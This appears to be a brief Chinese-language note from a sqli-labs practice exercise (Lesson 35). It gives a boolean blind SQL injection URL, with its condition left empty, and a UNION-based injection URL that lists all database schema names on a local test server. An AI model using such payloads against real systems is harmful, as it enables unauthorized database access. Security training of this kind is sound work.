# Lesson-35
```
Bool盲注-,-明注
```

盲注 : 
```
http://127.0.0.1/Less-35/?id=0||()--+
```
明注 : 
```
http://127.0.0.1/Less-35/?id=0%20union%20select%201,1,group_concat(schema_name)%20from%20information_schema.schemata--+
```
